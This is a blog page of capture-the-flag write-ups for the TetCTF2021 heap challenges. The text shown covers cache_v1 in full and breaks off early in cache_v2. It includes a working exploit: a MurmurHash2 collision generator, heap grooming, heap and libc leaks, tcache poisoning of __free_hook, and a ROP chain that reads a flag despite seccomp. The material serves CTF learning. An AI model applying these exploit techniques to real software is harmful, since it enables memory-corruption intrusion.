<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>TetCTF2021 - cache_v1, cache_v2, SimpleSystem writeups - Midas Blog</title><meta name="Description" content="Writeups for TetCTF2021 heap pwn challenges"><meta property="og:title" content="TetCTF2021 - cache_v1, cache_v2, SimpleSystem writeups" />
<meta property="og:description" content="Writeups for TetCTF2021 heap pwn challenges" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://lkmidas.github.io/posts/20210103-tetctf2021-writeups/" />
<meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/>
<meta property="article:published_time" content="2021-01-03T04:48:09-08:00" />
<meta property="article:modified_time" content="2021-01-03T04:48:09-08:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>

<meta name="twitter:title" content="TetCTF2021 - cache_v1, cache_v2, SimpleSystem writeups"/>
<meta name="twitter:description" content="Writeups for TetCTF2021 heap pwn challenges"/>
<meta name="application-name" content="Midas Blog">
<meta name="apple-mobile-web-app-title" content="Midas Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://lkmidas.github.io/posts/20210103-tetctf2021-writeups/" /><link rel="prev" href="https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/" /><link rel="next" href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "TetCTF2021 - cache_v1, cache_v2, SimpleSystem writeups",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/lkmidas.github.io\/posts\/20210103-tetctf2021-writeups\/"
        },"genre": "posts","wordcount":  3653 ,
        "url": "https:\/\/lkmidas.github.io\/posts\/20210103-tetctf2021-writeups\/","datePublished": "2021-01-03T04:48:09-08:00","dateModified": "2021-01-03T04:48:09-08:00","publisher": {
            "@type": "Organization",
            "name": "Midas"},"author": {
                "@type": "Person",
                "name": "Midas"
            },"description": "Writeups for TetCTF2021 heap pwn challenges"
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Midas Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/avatar.png"
        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
        data-sizes="auto"
        alt="/images/avatar.png"
        title="/images/avatar.png" /></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Midas Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/avatar.png"
        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
        data-sizes="auto"
        alt="/images/avatar.png"
        title="/images/avatar.png" /></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">TetCTF2021 - cache_v1, cache_v2, SimpleSystem writeups</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Midas</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw"></i>writeups</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-03">2021-01-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3653 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;18 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#cache_v1">cache_v1</a>
      <ul>
        <li><a href="#introduction">Introduction</a></li>
        <li><a href="#analyzing-the-source-code">Analyzing the source code</a></li>
        <li><a href="#finding-hash-collision">Finding hash collision</a></li>
        <li><a href="#setup-the-heap">Setup the heap</a></li>
        <li><a href="#leak-heap-and-libc">Leak heap and libc</a></li>
        <li><a href="#tcache-poisoning">Tcache poisoning</a></li>
        <li><a href="#appendix">Appendix</a></li>
      </ul>
    </li>
    <li><a href="#cache_v2">cache_v2</a>
      <ul>
        <li><a href="#introduction-1">Introduction</a></li>
        <li><a href="#analyzing-the-source-code-1">Analyzing the source code</a></li>
        <li><a href="#erasing-an-overflowed-cache">Erasing an overflowed cache</a></li>
        <li><a href="#setup-the-heap-1">Setup the heap</a></li>
        <li><a href="#leak-heap-and-libc-1">Leak heap and libc</a></li>
        <li><a href="#tcache-poisoning-1">Tcache poisoning</a></li>
        <li><a href="#appendix-1">Appendix</a></li>
      </ul>
    </li>
    <li><a href="#simplesystem">SimpleSystem</a>
      <ul>
        <li><a href="#introduction-2">Introduction</a></li>
        <li><a href="#analyzing-the-binary">Analyzing the binary</a></li>
        <li><a href="#exploit-the-multithreaded-heap">Exploit the multithreaded heap</a></li>
        <li><a href="#overwrite-got-and-get-shell">Overwrite GOT and get shell</a></li>
        <li><a href="#appendix-2">Appendix</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="preface">Preface</h2>
<p>As always, <strong>TetCTF</strong> is a great event to start the year with. This year, I managed to first-blood (and we Efiens are being the only Vietnamese team that can solve) the 3 phenomenal heap pwning challenges. Here are my writeups for them.</p>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><em>Use the table of contents on the right to navigate to the challenge that you are interested in.</em></div>
        </div>
    </div>
<hr>
<h2 id="cache_v1">cache_v1</h2>
<h3 id="introduction">Introduction</h3>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ul>
<li><strong>Given files:</strong> <a href="/posts/20210103-tetctf2021-writeups/cache_v1/cache" rel="">cache</a>, <a href="/posts/20210103-tetctf2021-writeups/cache_v1/cache.cpp" rel="">cache.cpp</a>, <a href="cache_v1/libc-2.31.si" rel="">libc-2.31.so</a>, <a href="/posts/20210103-tetctf2021-writeups/cache_v1/ld-2.31.so" rel="">ld-2.31.so</a>.</li>
<li><strong>Description:</strong> <code>Flag stored in /home/cache/flag</code></li>
<li><strong>Category:</strong> Pwnable (actually <code>crypwn</code>, to be exact)</li>
<li><strong>Summary:</strong> A <code>C++</code> glibc 2.31 heap challenge with <code>seccomp</code> rules that is very strict. We are given the source file for this challenge, so reverse engineering it is not a problem. The challenge also requires some math and crypto knowledge.</li>
</ul>
</div>
        </div>
    </div>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>TL;DR<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ol>
<li>Analyze the source code -&gt; Found that the <code>caches</code> use the <code>name</code>&rsquo;s <code>std::hash</code> as the key -&gt; Maybe vulnearable to hash collision.</li>
<li>Find two names whose hashes collide -&gt; Create a small cache first, then create a large one that collides with it will cause an out-of-bound read and write.</li>
<li>Setup the heap perfectly to exploit.</li>
<li>Use OOB read to leak <code>heap</code> and <code>libc</code>.</li>
<li>Use OOB write to poison tcache -&gt; overwrite <code>__free_hook</code> into ROP to workaround <code>seccomp</code> and read the flag.</li>
</ol>
</div>
        </div>
    </div>
<h3 id="analyzing-the-source-code">Analyzing the source code</h3>
<p>This program is a cache management system implemented in C++, it has the following functionalities:</p>
<ul>
<li><code>Create</code> a cache with a unique name and (almost) arbitrary positive size (the upper bound is very high).</li>
<li><code>Read</code> data from a cache at an offset.</li>
<li><code>Write</code> data to a cache at an offset.</li>
<li><code>Erase</code> a cache.</li>
</ul>
<p>The <code>create</code> cache option uses a global <code>unordered_map</code> called <code>caches</code> to keep track of created caches. It is indexed by a key which is the <code>std::hash&lt;std::string&gt;{}(name)</code> of the inputted <code>name</code>. This is maybe vulnearable to a hash collision attack, because if we can find two names that have the same hash, we can overlap a cache&rsquo;s size with another&rsquo;s:</p>
<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">caches</span><span class="p">[</span><span class="n">std</span><span class="o">::</span><span class="n">hash</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span><span class="p">{}(</span><span class="n">name</span><span class="p">)].</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</code></pre></div><p>Also, the cache&rsquo;s chunk to store the content on the heap is only created when we try to <code>write</code> into it, not when we <code>create</code> it, so we can write to a small cache to create a small chunk, then over write the size with the large one.</p>
<p>Because I couldn&rsquo;t find another vulnerability in the implementation, this is the path that I followed.</p>
<p>Also, this is the output of <code>seccomp-tools dump</code> on the binary:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">line  CODE  JT   JF      <span class="nv">K</span>
<span class="o">=================================</span>
0000: 0x20 0x00 0x00 0x00000004  <span class="nv">A</span> <span class="o">=</span> arch
0001: 0x15 0x00 0x09 0xc000003e  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> ARCH_X86_64<span class="o">)</span> goto <span class="m">0011</span>
0002: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
0003: 0x35 0x07 0x00 0x40000000  <span class="k">if</span> <span class="o">(</span>A &gt;<span class="o">=</span> 0x40000000<span class="o">)</span> goto <span class="m">0011</span>
0004: 0x15 0x07 0x00 0x00000002  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> open<span class="o">)</span> goto <span class="m">0012</span>
0005: 0x15 0x06 0x00 0x00000000  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> <span class="nb">read</span><span class="o">)</span> goto <span class="m">0012</span>
0006: 0x15 0x05 0x00 0x00000001  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> write<span class="o">)</span> goto <span class="m">0012</span>
0007: 0x15 0x04 0x00 0x00000003  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> close<span class="o">)</span> goto <span class="m">0012</span>
0008: 0x15 0x03 0x00 0x0000000c  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> brk<span class="o">)</span> goto <span class="m">0012</span>
0009: 0x15 0x02 0x00 0x00000009  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> mmap<span class="o">)</span> goto <span class="m">0012</span>
0010: 0x15 0x01 0x00 0x000000e7  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> exit_group<span class="o">)</span> goto <span class="m">0012</span>
0011: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
0012: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
</code></pre></div><h3 id="finding-hash-collision">Finding hash collision</h3>
<p>I don&rsquo;t know much about math and cryptography, so I started googling to see which hashing algorithm does <code>C++</code> standard library use. It lead me to <a href="https://sites.google.com/site/murmurhash/" target="_blank" rel="noopener noreffer">this site</a>, where most variances of <code>MurmurHash</code> is implemented. The version that <code>C++</code> standard library uses in a 64-bit environment is <code>MurmurHash2Unaligned</code>, which is implemented as <code>MurmurHash64A</code> in <a href="/posts/20210103-tetctf2021-writeups/cache_v1/MurmurHash2.cpp" rel="">MurmurHash2_64.cpp</a>.</p>
<p>More googling on how to collide this hash lead me to <a href="http://emboss.github.io/blog/2012/12/14/breaking-murmur-hash-flooding-dos-reloaded/" target="_blank" rel="noopener noreffer">this post</a>, which shows in details how to create collided keys for <code>MurmurHash2</code>. The implementation of <code>MurmurHash2</code> in the blog post is almost identical to the one in <code>C++</code>, except some constants. I asked my team&rsquo;s crypto player <a href="https://blog.efiens.com/author/pcback/" target="_blank" rel="noopener noreffer">@pcback</a> to read it and try to re-implement it for me, and he came up with this script:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">INV_MAGIC</span> <span class="o">=</span> <span class="mh">0x5f7a0ea7e59b19bd</span>
<span class="n">R</span> <span class="o">=</span> <span class="mi">16</span>
<span class="n">MASK64</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span>
<span class="n">DIFF</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x80</span><span class="s2">&#34;</span>
<span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0xc6a4a793</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x5bd1e995</span>
<span class="n">h</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0xc70f6907</span> <span class="o">^</span> <span class="p">(</span><span class="mi">16</span> <span class="o">*</span> <span class="n">m</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="mi">47</span>

<span class="k">def</span> <span class="nf">unshiftRight</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">shift</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">x</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">x</span> <span class="o">^</span> <span class="n">res</span> <span class="o">&gt;&gt;</span> <span class="n">shift</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="k">def</span> <span class="nf">invert64</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span> <span class="o">*</span> <span class="mh">0x5f7a0ea7e59b19bd</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK64</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">unshiftRight</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
    <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="mh">0x5f7a0ea7e59b19bd</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK64</span>
    <span class="k">return</span> <span class="nb">int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>

<span class="n">a</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">16</span>
<span class="n">b</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">DIFF</span><span class="p">))</span>

<span class="n">x1</span><span class="p">,</span> <span class="n">x2</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span> <span class="s1">&#39;little&#39;</span><span class="p">),</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">8</span><span class="p">:],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="n">y1</span><span class="p">,</span> <span class="n">y2</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span> <span class="s1">&#39;little&#39;</span><span class="p">),</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="mi">8</span><span class="p">:],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>

<span class="k">print</span><span class="p">((</span><span class="n">invert64</span><span class="p">(</span><span class="n">y1</span><span class="p">)</span> <span class="o">+</span> <span class="n">invert64</span><span class="p">(</span><span class="n">y2</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
<span class="k">print</span><span class="p">((</span><span class="n">invert64</span><span class="p">(</span><span class="n">x1</span><span class="p">)</span> <span class="o">+</span> <span class="n">invert64</span><span class="p">(</span><span class="n">x2</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</code></pre></div><p>The script provides two strings whose hashes collide (hex-encoded):</p>
<pre><code>c2c48614896beac4c2c48614896beac4
c2c4c9faed854236c2c4c9faed854236
</code></pre><p>With that in hands, I could continue with the exploit.</p>
<h3 id="setup-the-heap">Setup the heap</h3>
<p>With the hash collision in hands, my plan was clear: Create a small cache, then collide it with a larger one to achieve out-of-bound read and write through that cache. The first step is to perfectly construct the heap so that I could read/write all the stuffs I need:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">## Create a small cache to collide on later</span>
<span class="n">create</span><span class="p">(</span><span class="n">collide1</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span> 
<span class="n">write</span><span class="p">(</span><span class="n">collide1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="c1">## Create victim caches to poison</span>
<span class="n">create</span><span class="p">(</span><span class="s2">&#34;victim1&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> 
<span class="n">write</span><span class="p">(</span><span class="s2">&#34;victim1&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="s2">&#34;victim2&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> 
<span class="n">write</span><span class="p">(</span><span class="s2">&#34;victim2&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;C&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="c1">## Create large cache to leak libc</span>
<span class="n">create</span><span class="p">(</span><span class="s2">&#34;leak&#34;</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">)</span> 
<span class="n">write</span><span class="p">(</span><span class="s2">&#34;leak&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;D&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="c1">## Create padding cache to avoid consolidate</span>
<span class="n">create</span><span class="p">(</span><span class="s2">&#34;padd&#34;</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span> 
<span class="n">write</span><span class="p">(</span><span class="s2">&#34;padd&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="c1">## Collide the first cache with a very large one</span>
<span class="n">create</span><span class="p">(</span><span class="n">collide2</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">)</span> 
</code></pre></div><p>With the above setup, I have two small <code>victim</code> chunks to poison later, and a large chunk that will go into <code>unsorted bin</code> when freed to leak <code>libc</code>.</p>
<h3 id="leak-heap-and-libc">Leak heap and libc</h3>
<p>Simply read a heap pointer that is stored somewhere on the heap to leak <code>heap</code>, and free the large chunk to leak <code>libc</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">## Leak heap</span>
<span class="n">read</span><span class="p">(</span><span class="n">collide2</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x144d0</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;heap: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)))</span>

<span class="c1">## Erase large cache, leak libc</span>
<span class="n">erase</span><span class="p">(</span><span class="s2">&#34;leak&#34;</span><span class="p">)</span>
<span class="n">read</span><span class="p">(</span><span class="n">collide2</span><span class="p">,</span> <span class="mh">0x380</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
<span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;libc: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">address</span><span class="p">)))</span>
</code></pre></div><h3 id="tcache-poisoning">Tcache poisoning</h3>
<p>Freeing the two <code>victim</code> chunks and we can easily overwrite their <code>fd</code> pointer, classic <code>tcache poisoning</code>. With that, I now could overwrite <code>__free_hook</code> and also had all the leaked addresses in my hands. I could just use my ROP chain that I explained <a href="https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/" target="_blank" rel="noopener noreffer">here</a> to read the flag. Note that the <code>payload</code> must be put into a cache&rsquo;s <code>name</code>, not <code>content</code>, because the <code>name</code> is what actually got <code>free()</code> first when we call <code>erase</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">## Erase victims, overwrite victim2&#39;s fd to __free_hook</span>
<span class="n">erase</span><span class="p">(</span><span class="s2">&#34;victim1&#34;</span><span class="p">)</span>
<span class="n">erase</span><span class="p">(</span><span class="s2">&#34;victim2&#34;</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="n">collide2</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__free_hook&#34;</span><span class="p">]))</span>

<span class="c1">## Build ROP payload</span>
<span class="n">base</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x124b0</span>             <span class="c1">## payload_base (address of the chunk)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span>                  <span class="c1">## &lt;-- [rdi] &lt;-- payload_base</span>
<span class="o">...</span> <span class="c1">## read the full payload in my other post or my full script</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/home/cache/flag&#34;</span>

<span class="c1">## Create a cache with payload as its name</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="c1">## Overwrite __free_hook with call_gadget</span>
<span class="n">create</span><span class="p">(</span><span class="s2">&#34;free&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="s2">&#34;free&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_gadget</span><span class="p">))</span>

<span class="c1">## Execute the chain</span>
<span class="n">erase</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div><p>The flag is:</p>
<pre><code>TetCTF{https://www.youtube.com/watch?v=NvOHijJqups}
</code></pre><h3 id="appendix">Appendix</h3>
<p>The MurmurHash2 implementation in <code>C++</code> standard library is <a href="/posts/20210103-tetctf2021-writeups/cache_v1/MurmurHash2.cpp" rel="">MurmurHash2.cpp</a>.</p>
<p>The script for finding hash collision is <a href="/posts/20210103-tetctf2021-writeups/cache_v1/collide.py" rel="">collide.py</a>.</p>
<p>The full exploit is <a href="/posts/20210103-tetctf2021-writeups/cache_v1/a.py" rel="">a.py</a>.</p>
<hr>
<h2 id="cache_v2">cache_v2</h2>
<h3 id="introduction-1">Introduction</h3>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ul>
<li><strong>Given files:</strong> <a href="/posts/20210103-tetctf2021-writeups/cache_v2/cache" rel="">cache</a>, <a href="/posts/20210103-tetctf2021-writeups/cache_v2/cache.cpp" rel="">cache.cpp</a>, <a href="/posts/20210103-tetctf2021-writeups/cache_v2/libc-2.31.so" rel="">libc-2.31.so</a>, <a href="/posts/20210103-tetctf2021-writeups/cache_v2/ld-2.31.so" rel="">ld-2.31.so</a>.</li>
<li><strong>Description:</strong> <code>Flag stored in /home/cache/flag</code></li>
<li><strong>Category:</strong> Pwnable</li>
<li><strong>Summary:</strong> Another <code>C++</code> glibc 2.31 heap challenge that is the sequel to <code>cache_v1</code>. The source code is also given although the implementation of the system is different from <code>cache_v1</code>.</li>
</ul>
</div>
        </div>
    </div>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>TL;DR<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ol>
<li>Analyze the source code -&gt; Found that there is a <code>uint8_t</code> integer overflow in <code>refCount</code>.</li>
<li>Create a large cache, duplicate it over and over to overflow <code>refCount</code>, then <code>erase</code> it -&gt; <code>unique_ptr</code> will be deleted and the pointer it&rsquo;s managing will point to <code>tcache_perthread_struct</code> -&gt; Can read and write (almost) anywhere on the heap with this.</li>
<li>Setup the heap perfectly to exploit.</li>
<li>Use OOB read to leak <code>heap</code> and <code>libc</code>.</li>
<li>Use OOB write to poison tcache -&gt; overwrite <code>__free_hook</code> into ROP to workaround <code>seccomp</code> and read the flag.</li>
</ol>
</div>
        </div>
    </div>
<h3 id="analyzing-the-source-code-1">Analyzing the source code</h3>
<p>This program is a cache management system implemented in C++, its functionalities is the same as <code>cache_v1</code>, with the addition of <code>Duplicate</code>:</p>
<ul>
<li><code>Create</code> a cache with a unique name and (almost) arbitrary positive size (the upper bound is very high).</li>
<li><code>Read</code> data from a cache at an offset.</li>
<li><code>Write</code> data to a cache at an offset.</li>
<li><code>Erase</code> a cache.</li>
